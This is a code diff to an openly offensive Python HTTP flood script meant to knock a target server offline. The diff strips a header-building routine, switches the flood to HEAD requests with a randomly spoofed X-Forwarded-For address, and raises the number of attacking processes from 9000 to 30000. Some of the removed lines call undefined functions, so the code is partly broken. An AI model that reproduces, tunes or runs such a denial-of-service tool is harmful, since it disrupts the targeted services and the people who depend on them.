@@ -4,12 +4,6 @@ from time import sleep
 import multiprocessing
 import random
 import platform
-from random import choice
-
-def random_data():
-    return str(Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
-        strings) + Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
-        strings))
 
 print("Detecting System...")
 sysOS = platform.system()
@@ -23,30 +17,19 @@ if sysOS == "Linux":
     print("Could not start the script")
 else:
   print("Your system is not Linux, You may not be able to run this script in some systems")
-def Headers(method):
-    header = ""
-    if method == "get" or method == "head":
-        connection = "Connection: Keep-Alive\r\n"
-        accept = Choice(acceptall) + "\r\n"
-        referer = "Referer: " + referers + target + path + "\r\n"
-        connection += "Cache-Control: max-age=0\r\n"
-        connection += "pragma: no-cache\r\n"
-        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
-        useragent = "User-Agent: " + UserAgent + "\r\n"
-        header = referer + useragent + accept + connection + "\r\n\r\n"
-    return header
+
+
 def randomip():
   randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
   return randip
 
 
 def attack():
-  header = Headers("get")
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + header
+  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+  request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -67,7 +50,7 @@ print("[>>>] Starting the attack [<<<]")
 sleep(1)
 
 def send2attack():
-  for i in range(9000): #Magic Power
+  for i in range(30000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
